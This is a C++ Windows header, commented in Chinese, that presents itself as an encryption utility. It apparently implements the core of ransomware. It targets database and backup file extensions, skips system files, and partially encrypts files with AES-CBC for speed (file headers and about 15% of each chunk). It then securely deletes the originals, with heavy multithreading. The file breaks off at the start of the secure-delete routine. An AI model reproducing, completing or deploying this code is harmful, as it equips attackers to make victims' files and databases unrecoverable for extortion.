// EncryptionUtils.h - MVVM架构重构版
#pragma once

#ifndef ENCRYPTION_UTILS_H
#define ENCRYPTION_UTILS_H

#define NOMINMAX
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <filesystem>
#include <random>
#include <algorithm>
#include <bcrypt.h>
#include <shlobj.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <queue>
#include <atomic>
#include <unordered_set>
#include <sstream>
#include <iomanip>
#include <memory>
#include <climits>
#include <intrin.h>
#include <map>
#include <unordered_map>
#include <functional>
#include <stdexcept>
#include <future>
#include <optional>


// 使用inline避免重复定义
inline constexpr DWORD HEADER_ENCRYPT_SIZE = 4096;
inline constexpr DWORD KEY_LENGTH = 32;
inline constexpr DWORD IV_LENGTH = 16;
inline constexpr DWORD TAG_LENGTH = 0;
inline constexpr size_t MEMORY_POOL_SIZE = 1024 * 1024 * 64;
inline constexpr DWORD MAX_CONCURRENT_IO = 80;
inline constexpr size_t ASYNC_BUFFER_SIZE = 1024 * 1024;
inline constexpr size_t CHUNK_ENCRYPT_RATIO = 15;
inline constexpr size_t CHUNK_SIZE = 1024 * 1024;
inline constexpr size_t LARGE_FILE_THRESHOLD = 64 * 1024 * 1024;
inline constexpr size_t SMALL_FILE_THRESHOLD = 1024 * 1024;
inline constexpr DWORD IOCP_CONCURRENCY = 4;
inline constexpr DWORD AESNI_BATCH_SIZE = 8;
inline constexpr DWORD MAX_WORKER_THREADS = 64;
inline constexpr DWORD IO_THREADS = 4;
inline constexpr DWORD COMPUTE_THREADS = 16;
inline constexpr DWORD MANAGER_THREADS = 1;

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "kernel32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace fs = std::filesystem;
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key);
// 前向声明
bool SecureDelete(const fs::path& path);

// 自定义min/max替代函数
template<typename T>
T custom_min(T a, T b) {
    return a < b ? a : b;
}

template<typename T>
T custom_max(T a, T b) {
    return a > b ? a : b;
}

// 辅助函数
inline void GenerateRandomKey(BYTE* key, DWORD length);
inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName);
inline fs::path GetUserDocumentsPath();
inline bool IsAesNiSupported();
inline std::string to_hex(NTSTATUS status);

// 内存管理
class MemoryPool {
public:
    MemoryPool(size_t poolSize = MEMORY_POOL_SIZE);
    ~MemoryPool();

    void* allocate(size_t size, size_t alignment = 16);
    void deallocate(void* ptr);
    void reset();
    size_t getUsedMemory() const;
    size_t getTotalMemory() const;

private:
    std::vector<uint8_t> buffer;
    size_t usedMemory;
    size_t totalMemory;
};

// 数据库文件检测
class DatabaseFileDetector {
public:
    static bool isDatabaseFile(const fs::path& path);
    static const std::unordered_set<std::string>& getDatabaseExtensions();

private:
    static const std::unordered_set<std::string> databaseExtensions;
};

// 系统文件检测
class SystemFileDetector {
public:
    static bool isSystemFile(const fs::path& path);
    static const std::vector<std::wstring>& getSystemPatterns();

private:
    static const std::vector<std::wstring> systemPatterns;
};

// 数据模型
namespace Model {
    // 加密任务数据结构
    struct EncryptionTask {
        fs::path inputPath;
        fs::path outputPath;
        std::vector<uint8_t> key;
        size_t fileSize;
        bool isDatabaseFile;
        int priority;

        bool operator<(const EncryptionTask& other) const {
            return priority < other.priority;
        }
    };

    // 加密结果数据结构
    struct EncryptionResult {
        bool success;
        std::string errorMessage;
        size_t bytesProcessed;
        double processingTime;
        std::chrono::system_clock::time_point completionTime;
    };

    // 加密数据模型
    class EncryptionModel {
    public:
        EncryptionModel();
        ~EncryptionModel();

        std::vector<EncryptionTask> getPendingTasks() const;
        void addTask(const EncryptionTask& task);
        EncryptionResult executeTask(const EncryptionTask& task);
        void clearCompletedTasks();
        size_t getTaskCount() const;

    private:
        std::vector<EncryptionTask> tasks;
        std::vector<EncryptionResult> results;
        mutable std::mutex tasksMutex;
        mutable std::mutex resultsMutex;
    };

    // 文件系统数据模型
    class FileSystemModel {
    public:
        struct FileInfo {
            fs::path path;
            size_t size;
            bool isDatabaseFile;
            time_t lastModified;
            DWORD attributes;
        };

        FileSystemModel();
        ~FileSystemModel();

        std::vector<FileInfo> scanDirectory(const fs::path& directory,
            const std::vector<std::string>& extensions);
        bool secureDelete(const fs::path& path);
        bool isFileLocked(const fs::path& path) const;
        std::vector<FileInfo> getLockedFiles() const;

    private:
        bool isSystemFile(const fs::path& path) const;
        bool isDatabaseFile(const fs::path& path) const;
        std::vector<FileInfo> lockedFiles;
        mutable std::mutex lockedFilesMutex;
    };

    // 硬件数据模型
    class HardwareModel {
    public:
        struct HardwareInfo {
            bool aesniSupported;
            uint32_t coreCount;
            uint32_t threadCount;
            size_t totalMemory;
            size_t availableMemory;
            std::string cpuBrand;
            bool avxSupported;
            bool avx2Supported;
        };

        HardwareModel();
        ~HardwareModel();

        HardwareInfo getHardwareInfo() const;
        bool optimizeForHardware();

    private:
        bool checkAesNiSupport() const;
        uint32_t getCoreCount() const;
        std::string getCpuBrand() const;
        HardwareInfo cachedInfo;
    };
}

// 视图模型
namespace ViewModel {
    // 性能指标数据结构
    struct PerformanceMetrics {
        double cpuUsage;
        double memoryUsage;
        double diskThroughput;
        size_t filesProcessed;
        size_t bytesProcessed;
        std::chrono::milliseconds totalTime;
        size_t successfulEncryptions;
        size_t failedEncryptions;
        double encryptionRateMBs;
    };

    // 加密视图模型
    class EncryptionViewModel {
    public:
        EncryptionViewModel();
        ~EncryptionViewModel();

        void initialize();
        void shutdown();

        bool startEncryption(const fs::path& directory,
            const std::vector<std::string>& extensions);
        void stopEncryption();
        PerformanceMetrics getPerformanceMetrics() const;
        bool isEncryptionRunning() const;
        void pauseEncryption();
        void resumeEncryption();

    private:
        void processFiles();
        void scheduleTasks();
        void monitorPerformance();
        void updateMetrics(const Model::EncryptionResult& result);

        std::unique_ptr<Model::EncryptionModel> encryptionModel;
        std::unique_ptr<Model::FileSystemModel> fileSystemModel;
        std::unique_ptr<Model::HardwareModel> hardwareModel;

        std::atomic<bool> isRunning;
        std::atomic<bool> isPaused;
        std::thread processingThread;
        std::thread schedulingThread;
        std::thread monitoringThread;

        mutable std::mutex metricsMutex;
        PerformanceMetrics currentMetrics;
        std::chrono::steady_clock::time_point startTime;
    };
}

// 四层架构实现
namespace Architecture {
    // 任务优先级结构
    struct TaskPriority {
        size_t fileSize;
        bool isDatabaseFile;
        time_t timestamp;
        int userPriority;

        bool operator<(const TaskPriority& other) const {
            if (fileSize != other.fileSize) return fileSize < other.fileSize;
            if (isDatabaseFile != other.isDatabaseFile) return isDatabaseFile < other.isDatabaseFile;
            return timestamp < other.timestamp;
        }
    };

    // 调度层
    class SchedulerLayer {
    public:
        using EncryptionTask = Model::EncryptionTask;
        using EncryptionResult = Model::EncryptionResult;

        SchedulerLayer(size_t maxConcurrency);
        ~SchedulerLayer();

        void addTask(EncryptionTask task);
        std::optional<EncryptionTask> getNextTask();
        void completeTask(const EncryptionTask& task, const EncryptionResult& result);
        size_t getPendingTaskCount() const;
        size_t getCompletedTaskCount() const;
        void clearCompletedTasks();

    private:
        std::priority_queue<std::pair<TaskPriority, EncryptionTask>> taskQueue;
        std::vector<std::pair<EncryptionTask, EncryptionResult>> completedTasks;
        mutable std::mutex queueMutex;
        mutable std::mutex completedMutex;
        std::condition_variable queueCondition;
        std::atomic<size_t> activeTasks;
        size_t maxConcurrentTasks;
    };

    // 执行层
    class ExecutionLayer {
    public:
        ExecutionLayer(size_t threadCount);
        ~ExecutionLayer();

        bool executeTask(const Model::EncryptionTask& task);
        void stop();
        size_t getActiveThreadCount() const;

    private:
        void workerThread();
        bool processFile(const Model::EncryptionTask& task);
        bool encryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
            const BYTE* inputData, size_t fileSize,
            HANDLE hOutputFile, bool isDatabaseFile);
        size_t calculateChunkEncryptSize(size_t chunkSize) const;

        std::vector<std::thread> workerThreads;
        std::atomic<bool> stopFlag;
        std::atomic<size_t> activeThreads;
        MemoryPool memoryPool;
    };

    // 硬件层
    class HardwareLayer {
    public:
        HardwareLayer();
        ~HardwareLayer();

        bool initialize();
        void shutdown();

        bool encryptData(std::vector<uint8_t>& input, std::vector<uint8_t>& output,
            std::vector<uint8_t>& key, std::vector<uint8_t>& iv);
        bool supportsAESNI() const;
        bool supportsAVX() const;
        bool supportsAVX2() const;
        size_t getOptimalBatchSize() const;

    private:
        BCRYPT_ALG_HANDLE aesAlgorithm;
        bool aesniSupported;
        bool avxSupported;
        bool avx2Supported;
    };
}

// 应用层
class ApplicationLayer {
public:
    ApplicationLayer();
    ~ApplicationLayer();

    void run();
    void stop();
    void configure(const std::vector<std::string>& extensions,
        const fs::path& directory);
    ViewModel::PerformanceMetrics getMetrics() const;

private:
    std::unique_ptr<ViewModel::EncryptionViewModel> viewModel;
    std::vector<std::string> targetExtensions;
    fs::path targetDirectory;
};

// RAII封装 - 内存映射文件类
class MemoryMappedFile {
public:
    MemoryMappedFile() : hFile(INVALID_HANDLE_VALUE), hMapping(NULL), pData(nullptr), size(0) {}

    ~MemoryMappedFile() {
        close();
    }

    bool open(const fs::path& filePath, DWORD access = GENERIC_READ | GENERIC_WRITE,
        DWORD sharing = FILE_SHARE_READ | FILE_SHARE_WRITE,
        DWORD mappingProtect = PAGE_READWRITE, DWORD viewAccess = FILE_MAP_READ | FILE_MAP_WRITE) {
        close();

        // 尝试以完全访问权限打开文件
        hFile = CreateFileW(filePath.c_str(), access, sharing, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();

            // 如果访问被拒绝，尝试只读模式
            if (error == ERROR_ACCESS_DENIED || error == ERROR_SHARING_VIOLATION) {
                std::cerr << "警告: 无法以读写模式打开文件，尝试只读模式: " << filePath << std::endl;
                access = GENERIC_READ;
                sharing = FILE_SHARE_READ;
                mappingProtect = PAGE_READONLY;
                viewAccess = FILE_MAP_READ;

                hFile = CreateFileW(filePath.c_str(), access, sharing, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

                if (hFile == INVALID_HANDLE_VALUE) {
                    error = GetLastError();
                    std::cerr << "无法打开文件: " << filePath << " 错误: " << error << std::endl;
                    return false;
                }
            }
            else {
                std::cerr << "CreateFileW失败: " << filePath << " 错误: " << error << std::endl;
                return false;
            }
        }

        // 获取文件大小
        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            DWORD error = GetLastError();
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "GetFileSizeEx失败: " << error << std::endl;
            return false;
        }
        size = static_cast<size_t>(fileSize.QuadPart);

        // 处理空文件
        if (size == 0) {
            std::cerr << "文件为空: " << filePath << std::endl;
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            return false;
        }

        // 创建内存映射
        hMapping = CreateFileMappingW(hFile, NULL, mappingProtect, 0, 0, NULL);
        if (hMapping == NULL) {
            DWORD error = GetLastError();
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "CreateFileMappingW失败: " << error << std::endl;
            return false;
        }

        // 映射视图
        pData = MapViewOfFile(hMapping, viewAccess, 0, 0, size);
        if (pData == NULL) {
            DWORD error = GetLastError();
            CloseHandle(hMapping);
            CloseHandle(hFile);
            hMapping = NULL;
            hFile = INVALID_HANDLE_VALUE;
            std::cerr << "MapViewOfFile失败: " << error << std::endl;
            return false;
        }

        return true;
    }

    void close() {
        if (pData) {
            UnmapViewOfFile(pData);
            pData = nullptr;
        }
        if (hMapping != NULL) {
            CloseHandle(hMapping);
            hMapping = NULL;
        }
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            hFile = INVALID_HANDLE_VALUE;
        }
        size = 0;
    }

    void* data() const { return pData; }
    size_t getSize() const { return size; }
    bool isOpen() const { return pData != nullptr; }

private:
    HANDLE hFile;
    HANDLE hMapping;
    void* pData;
    size_t size;
};
// 异步加密管理器
class AsyncEncryptionManager {
public:
    AsyncEncryptionManager(size_t maxConcurrentTasks = MAX_CONCURRENT_IO)
        : maxConcurrentTasks(maxConcurrentTasks), stop(false), activeTasks(0),
        completedTasks(0), failedTasks(0) {
        // 创建工作线程
        for (size_t i = 0; i < maxConcurrentTasks; ++i) {
            workers.emplace_back([this] { worker(); });
        }
    }

    ~AsyncEncryptionManager() {
        stop = true;
        condition.notify_all();

        for (auto& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }

    void addTask(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
        std::unique_lock<std::mutex> lock(queueMutex);
        tasks.push({ inputFile, outputFile, key });
        lock.unlock();
        condition.notify_one();
    }

    void waitForCompletion() {
        std::unique_lock<std::mutex> lock(queueMutex);
        completionCondition.wait(lock, [this] {
            return tasks.empty() && activeTasks == 0;
            });
    }

    // 添加统计方法
    void printStatistics() {
        std::cout << "加密任务统计: " << std::endl;
        std::cout << "  成功: " << completedTasks << " 个文件" << std::endl;
        std::cout << "  失败: " << failedTasks << " 个文件" << std::endl;
        std::cout << "  总计: " << (completedTasks + failedTasks) << " 个文件" << std::endl;
    }

private:
    void worker() {
        while (!stop) {
            std::tuple<fs::path, fs::path, const BYTE*> task;

            {
                std::unique_lock<std::mutex> lock(queueMutex);
                condition.wait(lock, [this] {
                    return stop || !tasks.empty();
                    });

                if (stop && tasks.empty()) break;
                if (tasks.empty()) continue;

                task = tasks.front();
                tasks.pop();
                activeTasks++;
            }

            // 执行加密任务
            fs::path inputFile = std::get<0>(task);
            fs::path outputFile = std::get<1>(task);
            const BYTE* key = std::get<2>(task);

            bool encryptSuccess = EncryptFileCNG(inputFile, outputFile, key); // 这里需要实现加密函数

            {
                std::lock_guard<std::mutex> lock(queueMutex);
                if (encryptSuccess) {
                    completedTasks++;
                }
                else {
                    failedTasks++;
                }

                activeTasks--;
                if (tasks.empty() && activeTasks == 0) {
                    completionCondition.notify_all();
                }
            }
        }
    }

    std::queue<std::tuple<fs::path, fs::path, const BYTE*>> tasks;
    std::vector<std::thread> workers;
    std::mutex queueMutex;
    std::condition_variable condition;
    std::condition_variable completionCondition;
    std::atomic<bool> stop;
    std::atomic<size_t> activeTasks;
    std::atomic<size_t> completedTasks;
    std::atomic<size_t> failedTasks;
    size_t maxConcurrentTasks;
};

// 计算分块加密大小
inline size_t CalculateChunkEncryptSize(size_t chunkSize) {
    size_t encryptSize = static_cast<size_t>(chunkSize * CHUNK_ENCRYPT_RATIO / 100.0);
    // 对齐到16字节边界（AES块大小）
    encryptSize = encryptSize - (encryptSize % 16);
    return custom_max(encryptSize, static_cast<size_t>(16));
}

// CBC模式加密函数
inline bool EncryptFileChunksCBC(BCRYPT_KEY_HANDLE hKey, const BYTE* iv,
    const BYTE* inputData, size_t fileSize,
    HANDLE hOutputFile, bool isDatabaseFile) {
    try {
        DWORD bytesWritten = 0;
        LARGE_INTEGER writeOffset;

        if (!isDatabaseFile) {
            // 写入IV到文件开头
            writeOffset.QuadPart = 0;
            if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                throw std::runtime_error("SetFilePointerEx失败: IV写入");
            }

            if (!WriteFile(hOutputFile, iv, IV_LENGTH, &bytesWritten, NULL) || bytesWritten != IV_LENGTH) {
                throw std::runtime_error("写入IV失败");
            }
        }

        // 分块加密逻辑
        size_t totalChunks = (fileSize + CHUNK_SIZE - 1) / CHUNK_SIZE;
        std::vector<BYTE> chunkBuffer(CHUNK_SIZE);
        std::vector<BYTE> encryptedChunkBuffer(CHUNK_SIZE + 16); // 额外空间用于填充

        // 对于CBC模式，我们需要保持IV链
        BYTE currentIV[IV_LENGTH];
        memcpy(currentIV, iv, IV_LENGTH);

        for (size_t chunkIndex = 0; chunkIndex < totalChunks; ++chunkIndex) {
            size_t chunkOffset = chunkIndex * CHUNK_SIZE;
            size_t currentChunkSize = custom_min(CHUNK_SIZE, fileSize - chunkOffset);

            // 复制块数据到缓冲区
            memcpy(chunkBuffer.data(), inputData + chunkOffset, currentChunkSize);

            // 计算当前块的加密大小
            size_t encryptSizeThisChunk = 0;
            if (fileSize < SMALL_FILE_THRESHOLD) { // 小于1MB
                if (chunkIndex == 0) { // 只加密第一个块的头部
                    encryptSizeThisChunk = custom_min(static_cast<size_t>(HEADER_ENCRYPT_SIZE), currentChunkSize);
                }
            }
            else { // 大于等于1MB
                encryptSizeThisChunk = CalculateChunkEncryptSize(currentChunkSize);
                encryptSizeThisChunk = custom_min(encryptSizeThisChunk, currentChunkSize);
            }

            if (encryptSizeThisChunk > 0) {
                // 确保加密大小是16字节的倍数（AES块大小）
                size_t paddedSize = encryptSizeThisChunk;
                if (paddedSize % 16 != 0) {
                    paddedSize = paddedSize + (16 - (paddedSize % 16));
                }

                // 确保缓冲区足够大
                std::vector<BYTE> paddedChunk(paddedSize);
                memcpy(paddedChunk.data(), chunkBuffer.data(), encryptSizeThisChunk);

                // 对于非完整块，进行填充
                if (encryptSizeThisChunk < paddedSize) {
                    // 使用PKCS7填充
                    BYTE padValue = static_cast<BYTE>(paddedSize - encryptSizeThisChunk);
                    for (size_t i = encryptSizeThisChunk; i < paddedSize; ++i) {
                        paddedChunk[i] = padValue;
                    }
                }

                ULONG cbResult = 0;
                NTSTATUS status = BCryptEncrypt(
                    hKey,
                    paddedChunk.data(),
                    static_cast<ULONG>(paddedSize),
                    NULL,           // 不需要额外的认证信息
                    currentIV,      // 使用当前的IV
                    IV_LENGTH,
                    encryptedChunkBuffer.data(),
                    static_cast<ULONG>(encryptedChunkBuffer.size()),
                    &cbResult,
                    BCRYPT_BLOCK_PADDING  // 使用块填充
                );

                if (!NT_SUCCESS(status)) {
                    // 增强错误日志
                    std::cerr << "BCryptEncrypt失败 in chunk " << chunkIndex
                        << " with status: " << to_hex(status)
                        << " for input size: " << paddedSize << std::endl;

                    // 重试一次
                    status = BCryptEncrypt(
                        hKey,
                        paddedChunk.data(),
                        static_cast<ULONG>(paddedSize),
                        NULL,
                        currentIV,
                        IV_LENGTH,
                        encryptedChunkBuffer.data(),
                        static_cast<ULONG>(encryptedChunkBuffer.size()),
                        &cbResult,
                        BCRYPT_BLOCK_PADDING
                    );

                    if (!NT_SUCCESS(status)) {
                        throw std::runtime_error("BCryptEncrypt重试失败 in chunk " +
                            std::to_string(chunkIndex) + ": " + to_hex(status));
                    }
                }

                // 更新IV为最后一个密文块（用于下一个块的加密）
                if (cbResult >= IV_LENGTH) {
                    memcpy(currentIV, encryptedChunkBuffer.data() + cbResult - IV_LENGTH, IV_LENGTH);
                }

                // 写入加密数据
                writeOffset.QuadPart = isDatabaseFile ? chunkOffset : (IV_LENGTH + chunkOffset);
                if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx失败: 块写入");
                }

                if (!WriteFile(hOutputFile, encryptedChunkBuffer.data(), cbResult, &bytesWritten, NULL) ||
                    bytesWritten != cbResult) {
                    throw std::runtime_error("WriteFile失败 for chunk " + std::to_string(chunkIndex));
                }
            }

            // 写入当前块的剩余未加密数据（如果有）
            if (currentChunkSize > encryptSizeThisChunk) {
                size_t remainingSize = currentChunkSize - encryptSizeThisChunk;
                writeOffset.QuadPart = isDatabaseFile ?
                    (chunkOffset + encryptSizeThisChunk) :
                    (IV_LENGTH + chunkOffset + encryptSizeThisChunk);

                if (!SetFilePointerEx(hOutputFile, writeOffset, NULL, FILE_BEGIN)) {
                    throw std::runtime_error("SetFilePointerEx失败: 剩余数据写入");
                }

                if (!WriteFile(hOutputFile, chunkBuffer.data() + encryptSizeThisChunk,
                    static_cast<DWORD>(remainingSize), &bytesWritten, NULL) ||
                    bytesWritten != remainingSize) {
                    throw std::runtime_error("WriteFile失败 for remaining data in chunk " +
                        std::to_string(chunkIndex));
                }
            }
        }

        return true;
    }
    catch (const std::exception& e) {
        std::cerr << "分块加密错误: " << e.what() << std::endl;
        return false;
    }
}

// 修改EncryptFileCNG函数以使用CBC模式
bool EncryptFileCNG(const fs::path& inputFile, const fs::path& outputFile, const BYTE* key) {
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    std::vector<BYTE> keyObject;
    std::vector<BYTE> iv(IV_LENGTH);
    DWORD cbKeyObject = 0;
    NTSTATUS status;
    HANDLE hOutputFile = INVALID_HANDLE_VALUE;
    bool encryptionSuccess = false;
    MemoryMappedFile inputMap;

    try {
        // 检查文件是否可访问
        DWORD attributes = GetFileAttributesW(inputFile.c_str());
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            DWORD error = GetLastError();
            std::cerr << "无法访问文件: " << inputFile << " 错误: " << error << std::endl;
            return false;
        }

        // 检查文件是否被系统或隐藏
        if (attributes & (FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN)) {
            std::cerr << "跳过系统或隐藏文件: " << inputFile << std::endl;
            return false;
        }

        // 尝试打开内存映射文件（使用共享模式）
        if (!inputMap.open(inputFile, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, PAGE_READONLY, FILE_MAP_READ)) {
            DWORD error = GetLastError();
            std::cerr << "无法内存映射文件，可能被其他进程锁定: " << inputFile << " 错误: " << error << std::endl;
            return false;
        }

        // 检查文件大小
        size_t fileSize = inputMap.getSize();
        if (fileSize == 0) {
            std::cerr << "文件为空: " << inputFile << std::endl;
            return false;
        }

        // 检查AES-NI硬件加速支持
        bool hwAccelSupported = IsAesNiSupported();

        // 使用AES算法
        status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptOpenAlgorithmProvider失败: " + to_hex(status));
        }

        // 设置加密模式为CBC
        const wchar_t cbcMode[] = BCRYPT_CHAIN_MODE_CBC;
        status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE,
            reinterpret_cast<PBYTE>(const_cast<wchar_t*>(cbcMode)),
            sizeof(cbcMode), 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptSetProperty失败: " + to_hex(status));
        }

        // 获取密钥对象大小
        DWORD cbData = 0;
        status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH,
            reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbData, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGetProperty(OBJECT_LENGTH)失败: " + to_hex(status));
        }

        keyObject.resize(cbKeyObject);

        // 生成对称密钥 - AES-256需要32字节密钥
        status = BCryptGenerateSymmetricKey(
            hAlgorithm, &hKey, keyObject.data(), cbKeyObject,
            const_cast<BYTE*>(key), KEY_LENGTH, 0);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenerateSymmetricKey失败: " + to_hex(status));
        }

        // 生成随机IV
        status = BCryptGenRandom(NULL, iv.data(), IV_LENGTH, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!NT_SUCCESS(status)) {
            throw std::runtime_error("BCryptGenRandom失败: " + to_hex(status));
        }

        std::string extension = inputFile.extension().string();
        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

        // 数据库文件扩展名集合
        static const std::unordered_set<std::string> databaseExtensions = {
            ".mdf", ".ndf", ".ldf", ".bak", ".dbf", ".db", ".sqlite", ".sqlite3",
            ".accdb", ".mdb", ".frm", ".ibd", ".myi", ".myd", ".ora", ".dmp",
            ".backup", ".wal", ".journal", ".dat", ".bin"
        };

        bool isDatabaseFile = databaseExtensions.find(extension) != databaseExtensions.end();

        // 创建输出文件 - 增强权限处理
        DWORD desiredAccess = GENERIC_READ | GENERIC_WRITE;
        DWORD shareMode = FILE_SHARE_READ;
        DWORD creationDisposition = CREATE_ALWAYS;
        DWORD flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN;

        hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
            creationDisposition, flagsAndAttributes, NULL);

        if (hOutputFile == INVALID_HANDLE_VALUE) {
            DWORD error = GetLastError();
            if (error == ERROR_ACCESS_DENIED) {
                std::cerr << "警告: 无法以完全访问权限创建文件，尝试只写模式: " << outputFile << std::endl;

                desiredAccess = GENERIC_WRITE;
                shareMode = 0;
                hOutputFile = CreateFileW(outputFile.c_str(), desiredAccess, shareMode, NULL,
                    creationDisposition, flagsAndAttributes, NULL);

                if (hOutputFile == INVALID_HANDLE_VALUE) {
                    error = GetLastError();
                    std::cerr << "无法创建输出文件，跳过: " << outputFile << " 错误: " << error << std::endl;
                    throw std::runtime_error("CreateFile失败: " + std::to_string(error));
                }
            }
            else {
                throw std::runtime_error("CreateFile失败: " + std::to_string(error));
            }
        }

        // 计算输出文件大小 - CBC需要IV
        size_t outputSize = fileSize;
        if (!isDatabaseFile) {
            outputSize += IV_LENGTH; // 对于非数据库文件，在开头添加IV
        }

        // 设置文件大小
        LARGE_INTEGER liSize;
        liSize.QuadPart = outputSize;
        if (!SetFilePointerEx(hOutputFile, liSize, NULL, FILE_BEGIN)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetFilePointerEx失败: " + std::to_string(error));
        }

        if (!SetEndOfFile(hOutputFile)) {
            DWORD error = GetLastError();
            throw std::runtime_error("SetEndOfFile失败: " + std::to_string(error));
        }

        // 使用CBC模式加密函数
        if (!EncryptFileChunksCBC(hKey, iv.data(), static_cast<const BYTE*>(inputMap.data()),
            fileSize, hOutputFile, isDatabaseFile)) {
            throw std::runtime_error("CBC分块加密失败");
        }

        // 关闭内存映射和文件句柄
        inputMap.close();

        if (hOutputFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        // 释放CNG资源
        if (hKey) {
            BCryptDestroyKey(hKey);
            hKey = NULL;
        }
        if (hAlgorithm) {
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        // 加密完成后安全删除源文件
        std::cout << "加密完成，安全删除源文件: " << inputFile << std::endl;

        bool deleteSuccess = SecureDelete(inputFile);
        if (!deleteSuccess) {
            std::cerr << "警告: 安全删除失败，尝试普通删除: " << inputFile << std::endl;
            std::error_code ec;
            deleteSuccess = fs::remove(inputFile, ec);
            if (!deleteSuccess) {
                std::cerr << "普通删除也失败: " << inputFile << " 错误: " << ec.message() << std::endl;
                // 删除失败，返回false，但保留加密后的文件
                encryptionSuccess = false;
            }
        }

        if (deleteSuccess) {
            std::cout << "文件加密成功并删除源文件: " << inputFile << " -> " << outputFile << std::endl;
            encryptionSuccess = true;
        }
        else {
            std::cout << "文件加密成功但删除源文件失败: " << inputFile << " -> " << outputFile << std::endl;
            // 加密成功但删除失败，返回false
            encryptionSuccess = false;
        }

        return encryptionSuccess;
    }
    catch (const std::exception& e) {
        // 清理资源
        if (hKey) {
            BCryptDestroyKey(hKey);
            hKey = NULL;
        }
        if (hAlgorithm) {
            BCryptCloseAlgorithmProvider(hAlgorithm, 0);
            hAlgorithm = NULL;
        }

        if (hOutputFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hOutputFile);
            hOutputFile = INVALID_HANDLE_VALUE;
        }

        inputMap.close();

        // 删除不完整的输出文件
        if (!encryptionSuccess) {
            DWORD attributes = GetFileAttributesW(outputFile.c_str());
            if (attributes != INVALID_FILE_ATTRIBUTES) {
                if (attributes & FILE_ATTRIBUTE_READONLY) {
                    SetFileAttributesW(outputFile.c_str(), attributes & ~FILE_ATTRIBUTE_READONLY);
                }

                if (DeleteFileW(outputFile.c_str())) {
                    std::cout << "已删除不完整的输出文件: " << outputFile << std::endl;
                }
                else {
                    DWORD error = GetLastError();
                    std::cerr << "删除不完整输出文件失败: " << outputFile << " 错误: " << error << std::endl;
                }
            }
        }

        std::cerr << "加密错误: " << e.what() << " 文件: " << inputFile << std::endl;
        return false;
    }
}
// 实现辅助函数
inline void GenerateRandomKey(BYTE* key, DWORD length) {
    NTSTATUS status = BCryptGenRandom(
        NULL, key, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );
    if (!NT_SUCCESS(status)) {
        throw std::runtime_error("BCryptGenRandom failed: " + to_hex(status));
    }
}

inline bool SaveKeyToDocuments(const BYTE* key, DWORD length, const std::wstring& fileName) {
    fs::path savePath = GetUserDocumentsPath() / fileName;

    try {
        std::ofstream keyFile(savePath, std::ios::binary);
        if (!keyFile) return false;

        keyFile.write(reinterpret_cast<const char*>(key), length);
        return keyFile.good();
    }
    catch (...) {
        return false;
    }
}

inline fs::path GetUserDocumentsPath() {
    PWSTR path = nullptr;
    HRESULT hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &path);
    if (SUCCEEDED(hr)) {
        fs::path docsPath(path);
        CoTaskMemFree(path);
        return docsPath;
    }
    std::cerr << "SHGetKnownFolderPath failed: 0x" << std::hex << hr << std::endl;
    return fs::current_path();
}

inline bool IsAesNiSupported() {
    int cpuInfo[4];
    __cpuid(cpuInfo, 1); // 获取CPU功能标志

    // 检查第25位 (AES-NI支持标志)
    return (cpuInfo[2] & (1 << 25)) != 0;
}

inline std::string to_hex(NTSTATUS status) {
    std::stringstream ss;
    ss << "0x" << std::hex << std::setw(8) << std::setfill('0') << status;
    return ss.str();
}

// SecureDelete函数实现 - 修复版
bool SecureDelete(const fs::path& path) {
